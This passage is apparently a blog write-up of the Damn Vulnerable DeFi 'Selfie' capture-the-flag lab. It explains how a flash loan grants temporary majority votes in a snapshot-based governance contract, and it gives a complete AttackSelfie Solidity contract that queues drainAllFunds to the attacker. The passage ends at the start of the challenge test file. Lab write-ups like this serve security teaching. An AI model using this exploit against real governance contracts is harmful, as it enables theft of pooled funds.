+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">93
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">94
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">SimpleGovernance</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">using</span> <span style="color:#000">Address</span> <span style="color:#00f">for</span> <span style="color:#00f">address</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">struct</span> <span style="color:#000">GovernanceAction</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">address</span> <span style="color:#000">receiver</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">bytes</span> <span style="color:#000">data</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">weiAmount</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">proposedAt</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">executedAt</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#000">DamnValuableTokenSnapshot</span> <span style="color:#00f">public</span> <span style="color:#000">governanceToken</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">mapping</span>(<span style="color:#00f">uint256</span> =&gt; <span style="color:#000">GovernanceAction</span>) <span style="color:#00f">public</span> <span style="color:#000">actions</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">uint256</span> <span style="color:#00f">private</span> <span style="color:#000">actionCounter</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">uint256</span> <span style="color:#00f">private</span> <span style="color:#000">ACTION_DELAY_IN_SECONDS</span> = <span style="color:#3af">2</span> <span style="color:#00f">days</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">event</span> <span style="color:#000">ActionQueued</span>(<span style="color:#00f">uint256</span> <span style="color:#000">actionId</span>, <span style="color:#00f">address</span> <span style="color:#00f">indexed</span> <span style="color:#000">caller</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">event</span> <span style="color:#000">ActionExecuted</span>(<span style="color:#00f">uint256</span> <span style="color:#000">actionId</span>, <span style="color:#00f">address</span> <span style="color:#00f">indexed</span> <span style="color:#000">caller</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span>(<span style="color:#00f">address</span> <span style="color:#000">governanceTokenAddress</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">governanceTokenAddress</span> != <span style="color:#00f">address</span>(<span style="color:#3af">0</span>), <span style="color:#5a2">&#34;Governance token cannot be zero address&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">governanceToken</span> = <span style="color:#000">DamnValuableTokenSnapshot</span>(<span style="color:#000">governanceTokenAddress</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">actionCounter</span> = <span style="color:#3af">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">queueAction</span>(<span style="color:#00f">address</span> <span style="color:#000">receiver</span>, <span style="color:#00f">bytes</span> <span style="color:#000">calldata</span> <span style="color:#000">data</span>, <span style="color:#00f">uint256</span> <span style="color:#000">weiAmount</span>) <span style="color:#00f">external</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">_hasEnoughVotes</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>), <span style="color:#5a2">&#34;Not enough votes to propose an action&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">receiver</span> != <span style="color:#00f">address</span>(<span style="color:#000">this</span>), <span style="color:#5a2">&#34;Cannot queue actions that affect Governance&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">actionId</span> = <span style="color:#000">actionCounter</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">GovernanceAction</span> <span style="color:#00f">storage</span> <span style="color:#000">actionToQueue</span> = <span style="color:#000">actions</span>[<span style="color:#000">actionId</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#000">actionToQueue</span>.<span style="color:#000">receiver</span> = <span style="color:#000">receiver</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#000">actionToQueue</span>.<span style="color:#000">weiAmount</span> = <span style="color:#000">weiAmount</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#000">actionToQueue</span>.<span style="color:#000">data</span> = <span style="color:#000">data</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#000">actionToQueue</span>.<span style="color:#000">proposedAt</span> = <span style="color:#000">block</span>.<span style="color:#000">timestamp</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">actionCounter</span>++;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">emit</span> <span style="color:#000">ActionQueued</span>(<span style="color:#000">actionId</span>, <span style="color:#000">msg</span>.<span style="color:#000">sender</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> <span style="color:#000">actionId</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">executeAction</span>(<span style="color:#00f">uint256</span> <span style="color:#000">actionId</span>) <span style="color:#00f">external</span> <span style="color:#00f">payable</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">_canBeExecuted</span>(<span style="color:#000">actionId</span>), <span style="color:#5a2">&#34;Cannot execute this action&#34;</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#000">GovernanceAction</span> <span style="color:#00f">storage</span> <span style="color:#000">actionToExecute</span> = <span style="color:#000">actions</span>[<span style="color:#000">actionId</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#000">actionToExecute</span>.<span style="color:#000">executedAt</span> = <span style="color:#000">block</span>.<span style="color:#000">timestamp</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">actionToExecute</span>.<span style="color:#000">receiver</span>.<span style="color:#000">functionCallWithValue</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#000">actionToExecute</span>.<span style="color:#000">data</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#000">actionToExecute</span>.<span style="color:#000">weiAmount</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">emit</span> <span style="color:#000">ActionExecuted</span>(<span style="color:#000">actionId</span>, <span style="color:#000">msg</span>.<span style="color:#000">sender</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">getActionDelay</span>() <span style="color:#00f">public</span> <span style="color:#00f">view</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> <span style="color:#000">ACTION_DELAY_IN_SECONDS</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">     * @dev an action can only be executed if:
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">     * 1) it&#39;s never been executed before and
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">     * 2) enough time has passed since it was first proposed
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">     */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">_canBeExecuted</span>(<span style="color:#00f">uint256</span> <span style="color:#000">actionId</span>) <span style="color:#00f">private</span> <span style="color:#00f">view</span> <span style="color:#00f">returns</span> (<span style="color:#00f">bool</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">GovernanceAction</span> <span style="color:#00f">memory</span> <span style="color:#000">actionToExecute</span> = <span style="color:#000">actions</span>[<span style="color:#000">actionId</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> (
+</span></span><span style="display:flex;"><span>            <span style="color:#000">actionToExecute</span>.<span style="color:#000">executedAt</span> == <span style="color:#3af">0</span> &amp;&amp;
+</span></span><span style="display:flex;"><span>            (<span style="color:#000">block</span>.<span style="color:#000">timestamp</span> - <span style="color:#000">actionToExecute</span>.<span style="color:#000">proposedAt</span> &gt;= <span style="color:#000">ACTION_DELAY_IN_SECONDS</span>)
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">_hasEnoughVotes</span>(<span style="color:#00f">address</span> <span style="color:#000">account</span>) <span style="color:#00f">private</span> <span style="color:#00f">view</span> <span style="color:#00f">returns</span> (<span style="color:#00f">bool</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">balance</span> = <span style="color:#000">governanceToken</span>.<span style="color:#000">getBalanceAtLastSnapshot</span>(<span style="color:#000">account</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">halfTotalSupply</span> = <span style="color:#000">governanceToken</span>.<span style="color:#000">getTotalSupplyAtLastSnapshot</span>() / <span style="color:#3af">2</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> <span style="color:#000">balance</span> &gt; <span style="color:#000">halfTotalSupply</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<ul>
+<li><code>queueAction</code> is responsible for adding an action (represented by the <code>GovernanceAction</code> struct) in a queue that can be later executed by calling <code>executeAction</code>. The <code>GovernanceAction</code> has the following fields:
+<ul>
+<li><code>receiver</code>: the receiver of the action</li>
+<li><code>weiAmount</code>: the amount of wei to send in this call</li>
+<li><code>data</code>: function call to execute</li>
+<li><code>proposedAt</code>: timestamp used to keep track of when an action is proposed
+Two conditions need to be satisfied to add an action in the queue:
+<ul>
+<li>the <code>msg.sender</code> must have enough votes (line <code>39</code>). The right to vote is granted only to accounts with more than half of the governance&rsquo;s token (line <code>88-90</code>). Also, to determine if a contract has enough voting power, the information from the latest token snapshot is used (<code>getBalanceAtLastSnapshot</code> and <code>getTotalSupplyAtLastSnapshot</code>)</li>
+<li>the receiver of the action must not be the governance contract (line <code>40</code>)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>Once an action is added to the queue, it can be executed by calling <code>executeAction</code>. In particular, anyone can request the execution of an already registered action if at least two days have passed since it was proposed (<code>_canBeExecuted</code> - line <code>57</code> and <code>80-84</code>). The action will execute the function (stored in the <code>data</code> property) of the <code>receiver</code> contract.</p>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Who has enough votes to add an action to the queue?</div>
+        </div>
+    </div>
+<p>There are <code>2M</code> total supply tokens (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/selfie/selfie.challenge.js#L7" target="_blank" rel="noopener noreffer ">setup</a>), and the pool held <code>1.5M</code> of them (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/selfie/selfie.challenge.js#L25" target="_blank" rel="noopener noreffer ">setup</a>). It means the pool contract has enough voting power to add an action in the queue.</p>
+<p>Our goal is to drain all the balance. The <code>drainAllFunds</code> could be used to drain all the pool balance; however, only the governance contract can call it. To make the governance call the <code>drainAllFunds</code> (with a receiver address one of our control), we can add this as an action in the queue and execute it (after two days). The governance contract executes the action in the queue. This way, the <code>msg.sender</code> of the call to <code>drainAllFunds</code> will be the governance contract.</p>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">How can we add an action to the queue?</div>
+        </div>
+    </div>
+<p>The pool offers flash loans via the <code>flashLoan</code> function. It also calls <code>receiveTokens</code> from the receiver contract. If we request a loan equal to the pool balance, we&rsquo;ll have enough voting power to call the <code>queueAction</code> inside the <code>receiveTokens</code> function. In particular, the action we want the governance contract to call is <code>drainAllFunds</code> with our attacker address as the <code>receiver</code> address.</p>
+<h2 id="3-solution">3) Solution</h2>
+<p>The solution consists of the following steps:</p>
+<ul>
+<li>calls <code>flashLoan</code> requesting a loan equal to the pool balance</li>
+<li>inside the <code>receiveTokens</code> function, we need to:
+<ul>
+<li>create a token snapshot since we have all the pool balance token (the token it&rsquo;s an ERC20Snapshot) - this way, we&rsquo;ll use updated information when <code>_canBeExecuted</code> will be called</li>
+<li>call the <code>queueAction</code> with the following values:
+<ul>
+<li>receiver: the pool contract</li>
+<li>data: the <code>drainAllFunds</code> function with the attacker address as the receiver parameter</li>
+<li>weiAmount: <code>0</code></li>
+</ul>
+</li>
+<li>repay the loan back</li>
+</ul>
+</li>
+<li>once the <code>receiveTokens</code> function completes, we can call (after at least two days) the <code>executeAction</code> to execute the action we have just added</li>
+</ul>
+<p><code>AttackSelfie.sol</code>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#888;font-style:italic">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span><span style="color:#00f">pragma solidity</span> ^<span style="color:#3af">0</span>.<span style="color:#3af">8</span>.<span style="color:#3af">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">interface</span> <span style="color:#000">ISelfiePool</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">flashLoan</span>(<span style="color:#00f">uint256</span> <span style="color:#000">borrowAmount</span>) <span style="color:#00f">external</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">interface</span> <span style="color:#000">ISimpleGovernance</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">queueAction</span>(<span style="color:#00f">address</span> <span style="color:#000">receiver</span>, <span style="color:#00f">bytes</span> <span style="color:#000">calldata</span> <span style="color:#000">data</span>, <span style="color:#00f">uint256</span> <span style="color:#000">weiAmount</span>) <span style="color:#00f">external</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">executeAction</span>(<span style="color:#00f">uint256</span> <span style="color:#000">actionId</span>) <span style="color:#00f">external</span> <span style="color:#00f">payable</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">interface</span> <span style="color:#000">IDamnValuableTokenSnapshot</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#00f">function</span> <span style="color:#000">transfer</span>(<span style="color:#00f">address</span> <span style="color:#000">to</span>, <span style="color:#00f">uint256</span> <span style="color:#000">amount</span>) <span style="color:#00f">external</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#00f">function</span> <span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span> <span style="color:#000">account</span>) <span style="color:#00f">external</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#00f">function</span> <span style="color:#000">snapshot</span>() <span style="color:#00f">external</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"> * @title AttackSelfie
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">AttackSelfie</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">ISelfiePool</span> <span style="color:#000">pool</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#000">ISimpleGovernance</span> <span style="color:#000">governance</span>; 
+</span></span><span style="display:flex;"><span>    <span style="color:#000">IDamnValuableTokenSnapshot</span> <span style="color:#000">token</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">address</span> <span style="color:#000">attacker</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span>(<span style="color:#00f">address</span> <span style="color:#000">_pool</span>, <span style="color:#00f">address</span> <span style="color:#000">_governance</span>, <span style="color:#00f">address</span> <span style="color:#000">_token</span>, <span style="color:#00f">address</span> <span style="color:#000">_attacker</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">pool</span> = <span style="color:#000">ISelfiePool</span>(<span style="color:#000">_pool</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">governance</span> = <span style="color:#000">ISimpleGovernance</span>(<span style="color:#000">_governance</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">token</span> = <span style="color:#000">IDamnValuableTokenSnapshot</span>(<span style="color:#000">_token</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#000">attacker</span> = <span style="color:#000">_attacker</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">run</span>() <span style="color:#00f">public</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">amount</span> = <span style="color:#000">token</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">address</span>(<span style="color:#000">pool</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#000">pool</span>.<span style="color:#000">flashLoan</span>(<span style="color:#000">amount</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">executeAction</span>(<span style="color:#00f">uint256</span> <span style="color:#000">actionId</span>) <span style="color:#00f">public</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">governance</span>.<span style="color:#000">executeAction</span>(<span style="color:#000">actionId</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">receiveTokens</span>(<span style="color:#00f">address</span> <span style="color:#000">_address</span>, <span style="color:#00f">uint256</span> <span style="color:#000">amount</span>) <span style="color:#00f">public</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">IDamnValuableTokenSnapshot</span>(<span style="color:#000">_address</span>).<span style="color:#000">snapshot</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">governance</span>.<span style="color:#000">queueAction</span>(<span style="color:#00f">address</span>(<span style="color:#000">pool</span>), <span style="color:#000">abi</span>.<span style="color:#000">encodeWithSignature</span>(<span style="color:#5a2">&#34;drainAllFunds(address)&#34;</span>, <span style="color:#00f">address</span>(<span style="color:#000">attacker</span>)), <span style="color:#3af">0</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#000">IDamnValuableTokenSnapshot</span>(<span style="color:#000">_address</span>).<span style="color:#000">transfer</span>(<span style="color:#00f">address</span>(<span style="color:#000">pool</span>), <span style="color:#000">amount</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div></p>
+<p><code>selfie.challenge.js</code>:</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
